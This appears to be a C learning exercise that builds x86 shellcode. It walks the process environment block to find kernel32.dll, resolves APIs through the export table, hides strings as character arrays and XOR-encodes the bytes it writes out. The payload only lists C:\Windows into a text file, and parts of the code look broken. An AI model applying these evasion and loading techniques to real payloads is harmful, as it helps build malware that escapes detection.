#define _CRT_SECURE_NO_WARNINGS


#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a' : c1)
#define IMAGE_DOS_SIGNATURE 0x5A4D
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define NULL 0
#define _FILETIME_
#define _SAL_nop_impl_
#define _SA_annotes3(n,pp1,pp2,pp3)
#define _Group_impl_(annos)
#define _Group_(annos)                 _Group_impl_(annos _SAL_nop_impl_)
#define _Null_terminated_impl_
#define _SAL2_Source_(Name, args, annotes) _SA_annotes3(SAL_name, #Name, "", "2") _Group_(annotes _SAL_nop_impl_)
#define _Null_terminated_                 _SAL2_Source_(_Null_terminated_, (), _Null_terminated_impl_)
#define _Field_z_  _SAL2_Source_(_Field_z_, (), _Null_terminated_)
#define MAX_PATH 260
#define INVALID_HANDLE_VALUE ((void *)(long)-1)

#define _FILE_DEFINED
typedef struct _iobuf
{
	void* _Placeholder;
} FILE;


typedef struct LIST_ENTRY { /////////////////////////////////////////////////////
	struct _LIST_ENTRY* Flink;
	struct _LIST_ENTRY* Blink;
} LIST_ENTRY, * PLIST_ENTRY;
typedef struct _UNICODE_STRING {
	unsigned short Length;
	unsigned short MaximumLength;
	unsigned short* Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	void* BaseAddress;
	void* EntryPoint;
	unsigned long SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	unsigned long Flags;
	short LoadCount;
	short TlsIndex;
	void* SectionHandle;
	unsigned long CheckSum;
	unsigned long TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB_LDR_DATA {
	unsigned long Length;
	unsigned char   Initialized;
	void* SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	void* EntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;
typedef struct _PEB {
	unsigned char   InheritedAddressSpace;
	unsigned char   ReadImageFileExecOptions;
	unsigned char   BeingDebugged;
	unsigned char   SpareBool;
	void* Mutant;
	void* ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	// [...] это фрагмент, остальные элементы располагаются здесь
} PEB, * PPEB;
typedef struct _IMAGE_DATA_DIRECTORY {
	unsigned long   VirtualAddress;
	unsigned long   Size;
} IMAGE_DATA_DIRECTORY, * PIMAGE_DATA_DIRECTORY;
typedef struct _IMAGE_OPTIONAL_HEADER {
	//
	// Standard fields.
	//

	unsigned short    Magic;
	unsigned char    MajorLinkerVersion;
	unsigned char    MinorLinkerVersion;
	unsigned long   SizeOfCode;
	unsigned long   SizeOfInitializedData;
	unsigned long   SizeOfUninitializedData;
	unsigned long   AddressOfEntryPoint;
	unsigned long   BaseOfCode;
	unsigned long   BaseOfData;

	//
	// NT additional fields.
	//

	unsigned long   ImageBase;
	unsigned long   SectionAlignment;
	unsigned long   FileAlignment;
	unsigned short    MajorOperatingSystemVersion;
	unsigned short    MinorOperatingSystemVersion;
	unsigned short    MajorImageVersion;
	unsigned short    MinorImageVersion;
	unsigned short    MajorSubsystemVersion;
	unsigned short    MinorSubsystemVersion;
	unsigned long   Win32VersionValue;
	unsigned long   SizeOfImage;
	unsigned long   SizeOfHeaders;
	unsigned long   CheckSum;
	unsigned short    Subsystem;
	unsigned short    DllCharacteristics;
	unsigned long   SizeOfStackReserve;
	unsigned long   SizeOfStackCommit;
	unsigned long   SizeOfHeapReserve;
	unsigned long   SizeOfHeapCommit;
	unsigned long   LoaderFlags;
	unsigned long   NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, * PIMAGE_OPTIONAL_HEADER32;
typedef struct _IMAGE_FILE_HEADER {
	unsigned short    Machine;
	unsigned short    NumberOfSections;
	unsigned long   TimeDateStamp;
	unsigned long   PointerToSymbolTable;
	unsigned long   NumberOfSymbols;
	unsigned short    SizeOfOptionalHeader;
	unsigned short    Characteristics;
} IMAGE_FILE_HEADER, * PIMAGE_FILE_HEADER;
typedef struct _IMAGE_EXPORT_DIRECTORY {
	unsigned long   Characteristics;
	unsigned long   TimeDateStamp;
	unsigned short    MajorVersion;
	unsigned short    MinorVersion;
	unsigned long   Name;
	unsigned long   Base;
	unsigned long   NumberOfFunctions;
	unsigned long   NumberOfNames;
	unsigned long   AddressOfFunctions;     // RVA from base of image
	unsigned long   AddressOfNames;         // RVA from base of image
	unsigned long   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;
typedef struct _IMAGE_NT_HEADERS {
	unsigned long Signature;
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS, * PIMAGE_NT_HEADERS32;
typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
	unsigned short   e_magic;                     // Magic number
	unsigned short   e_cblp;                      // Bytes on last page of file
	unsigned short   e_cp;                        // Pages in file
	unsigned short   e_crlc;                      // Relocations
	unsigned short   e_cparhdr;                   // Size of header in paragraphs
	unsigned short   e_minalloc;                  // Minimum extra paragraphs needed
	unsigned short   e_maxalloc;                  // Maximum extra paragraphs needed
	unsigned short   e_ss;                        // Initial (relative) SS value
	unsigned short   e_sp;                        // Initial SP value
	unsigned short   e_csum;                      // Checksum
	unsigned short   e_ip;                        // Initial IP value
	unsigned short   e_cs;                        // Initial (relative) CS value
	unsigned short   e_lfarlc;                    // File address of relocation table
	unsigned short   e_ovno;                      // Overlay number
	unsigned short   e_res[4];                    // Reserved words
	unsigned short   e_oemid;                     // OEM identifier (for e_oeminfo)
	unsigned short   e_oeminfo;                   // OEM information; e_oemid specific
	unsigned short   e_res2[10];                  // Reserved words
	long   e_lfanew;                    // File address of new exe header
} IMAGE_DOS_HEADER, * PIMAGE_DOS_HEADER;
typedef struct _FILETIME {
	unsigned long dwLowDateTime;
	unsigned long dwHighDateTime;
} FILETIME, * PFILETIME, * LPFILETIME;
typedef struct _WIN32_FIND_DATAW {
	unsigned long dwFileAttributes;
	FILETIME ftCreationTime;
	FILETIME ftLastAccessTime;
	FILETIME ftLastWriteTime;
	unsigned long nFileSizeHigh;
	unsigned long nFileSizeLow;
	unsigned long dwReserved0;
	unsigned long dwReserved1;
	_Field_z_ unsigned short  cFileName[MAX_PATH];
	_Field_z_ unsigned short  cAlternateFileName[14];
} WIN32_FIND_DATAW, * PWIN32_FIND_DATAW, * LPWIN32_FIND_DATAW;

typedef struct _WIN32_FIND_DATAA {
	unsigned long dwFileAttributes;
	FILETIME ftCreationTime;
	FILETIME ftLastAccessTime;
	FILETIME ftLastWriteTime;
	unsigned long nFileSizeHigh;
	unsigned long nFileSizeLow;
	unsigned long dwReserved0;
	unsigned long dwReserved1;
	_Field_z_ char   cFileName[MAX_PATH];
	_Field_z_ char   cAlternateFileName[14];
} WIN32_FIND_DATAA, * PWIN32_FIND_DATAA, * LPWIN32_FIND_DATAA;


inline void* getModule(unsigned short* module_name) {
	PPEB peb = (PPEB)__readfsdword(0x30);
	PPEB_LDR_DATA ldr = peb->Ldr;
	LIST_ENTRY list = ldr->InLoadOrderModuleList;
	PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&list));
	PLDR_DATA_TABLE_ENTRY curr_module = Flink;

	while (curr_module != NULL && curr_module->BaseAddress != NULL) {
		if (curr_module->BaseDllName.Buffer == NULL)
			continue;
		unsigned short* curr_name = curr_module->BaseDllName.Buffer;
		unsigned int i = 0;
		for (i = 0; module_name[i] != 0 && curr_name[i] != 0; i++) {
			unsigned short c1, c2;
			TO_LOWERCASE(c1, module_name[i]);
			TO_LOWERCASE(c2, curr_name[i]);
			if (c1 != c2)
				break;
		}
		if (module_name[i] == 0 && curr_name[i] == 0) {
			return curr_module->BaseAddress;
		}
		curr_module = (PLDR_DATA_TABLE_ENTRY)curr_module->InLoadOrderModuleList.Flink;
	}
	return NULL;
}
inline void* get_func_by_name(void* module, char* func_name)
{
	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((unsigned char*)module + idh->e_lfanew);
	IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	if (exportsDir->VirtualAddress == NULL) {
		return NULL;
	}
	unsigned long expAddr = exportsDir->VirtualAddress;
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (unsigned long)module);
	unsigned long namesCount = exp->NumberOfNames;
	unsigned long funcsListRVA = exp->AddressOfFunctions;
	unsigned long funcNamesListRVA = exp->AddressOfNames;
	unsigned long namesOrdsListRVA = exp->AddressOfNameOrdinals;


	for (unsigned long i = 0; i < namesCount; i++)
	{
		unsigned long* nameRVA = (unsigned long*)(funcNamesListRVA + (unsigned char*)module + i * sizeof(unsigned long));
		unsigned short* nameIndex = (unsigned short*)(namesOrdsListRVA + (unsigned char*)module + i * sizeof(unsigned short));
		unsigned long* funcRVA = (unsigned long*)(funcsListRVA + (unsigned char*)module + (*nameIndex) * sizeof(unsigned long));
		char* curr_name = (char*)(*nameRVA + (unsigned char*)module);
		unsigned int k = 0;
		for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
			if (func_name[k] != curr_name[k])
				break;
		}
		if (func_name[k] == 0 && curr_name[k] == 0) {
			return (unsigned char*)module + (*funcRVA);
		}
	}
	return NULL;
}


#define far
typedef void far* LPVOID;
typedef _Null_terminated_ *NWPSTR, * LPWSTR, * PWSTR;
DECLARE_HANDLE(HINSTANCE);
typedef void* HMODULE;
typedef _Null_terminated_* LPSTR, * PSTR;
#define WINAPI      __stdcall
#define LPCSTR      LPSTR
#undef FAR
#undef  NEAR
#define FAR                 far
typedef int (FAR WINAPI* FARPROC)();
typedef void* HANDLE;

#define PAGE_EXECUTE_READWRITE  0x40  
#define near
#define _W64

typedef unsigned long       DWORD;
typedef DWORD near* PDWORD;
typedef _W64 unsigned long ULONG_PTR, * PULONG_PTR;
typedef ULONG_PTR SIZE_T, * PSIZE_T;

void __stdcall shellcode();

void temp() {
	__asm {
		push eax
		push edx
		push ebx

		xor edx, edx
		add edx, 120
		add edx, 120
		add edx, 120
		add edx, 120
		add edx, 116
		mov eax, esp
		add eax, 64
		Hassmen:
			mov ebx, [eax]
			xor ebx, 0xEEEEEEEE
			mov [eax], ebx
			add eax, 4
			sub edx, 4
			jnz Hassmen

			pop ebx
			pop edx
			pop eax
	}
	shellcode();
}

void __stdcall shellcode() {
	unsigned short baseString[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'};
	LPVOID base = getModule((const LPWSTR)baseString);

	const char func1String[] = { 'F', 'i', 'n', 'd', 'F','i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
	LPVOID func1 = get_func_by_name((HMODULE)base, (LPSTR)func1String);

	const char func2String[] = { 'F', 'i', 'n', 'd', 'N','e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
	LPVOID func2 = get_func_by_name((HMODULE)base, (LPSTR)func2String);

	const char func3String[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0' };
	LPVOID func3 = get_func_by_name((HMODULE)base, (LPSTR)func3String);

	HMODULE(WINAPI * f_FindFirstFileA)
		(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) = (HMODULE(WINAPI*)(LPCSTR, LPWIN32_FIND_DATAA))func1;

	HMODULE(WINAPI * f_FindNextFileA)
		(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData) = (HMODULE(WINAPI*)(HANDLE, LPWIN32_FIND_DATAA))func2;

	HMODULE(WINAPI * f_FindClose)
		(HANDLE hFindFile) = (HMODULE(WINAPI*)(HANDLE))func3;
	
	WIN32_FIND_DATAA FindFileData;
	const char startDir[] = { 'C',':','\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '*', '\0' };
	void* hf = f_FindFirstFileA(startDir, &FindFileData);
	if (hf == INVALID_HANDLE_VALUE) return;

	const char fileString[] = { 'i', 'n', 'f', 'o', 'D', 'i', 'r', '.', 't', 'x', 't', '\0' };
	const char mode[] = { 'w', '\0' };
	FILE* file = fopen(fileString, mode);

	int i = 0;
	char ch = '\n';
	do {
		if (i > 1) {
			fputs(FindFileData.cFileName, file);
			fputc(ch, file);
		}
		i++;
	} while (f_FindNextFileA(hf, &FindFileData));
	f_FindClose(hf);
	fclose(file);
}

void shellcodeEND() {}

int main() {
	//shellcode();
	FILE* out = fopen("shell.bin", "w");
	fwrite(temp, (int)shellcodeEND - (int)temp, 1, out);
	fclose(out);

	char myXor = 0xEE;
	int mySize = 641;
	int offset = 48;

	FILE* bin = fopen("shell.bin", "rb");
	FILE* xorBin = fopen("shell_xor.bin", "wb");
	unsigned char buf[642];

	fread(buf, sizeof(char), mySize, bin);
	for (int i = offset; i < mySize; i++)
		buf[i] ^= myXor;

	fwrite(buf, sizeof(char), mySize, xorBin);
	fclose(bin);
	fclose(xorBin);
	return 0;
}